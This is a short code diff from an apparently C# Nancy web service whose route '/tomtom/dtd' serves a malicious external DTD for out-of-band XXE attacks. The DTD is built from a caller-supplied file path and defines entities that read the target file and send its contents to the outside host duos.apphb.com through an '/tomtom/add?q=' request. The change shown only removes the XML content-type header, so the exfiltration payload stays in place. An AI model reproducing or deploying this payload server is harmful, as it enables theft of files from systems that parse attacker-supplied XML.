@@ -54,7 +54,7 @@ namespace DuosWeb
             Get["/tomtom/dtd"] = _ =>
             {
                 string path = _.path;
-                return Response.AsText("<!ENTITY % data SYSTEM \"" + path + "\"><!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://duos.apphb.com/tomtom/add?q=%data;'>\">").WithContentType("application/xml");
+                return Response.AsText("<!ENTITY % data SYSTEM \"" + path + "\"><!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://duos.apphb.com/tomtom/add?q=%data;'>\">");
             };
         }
 
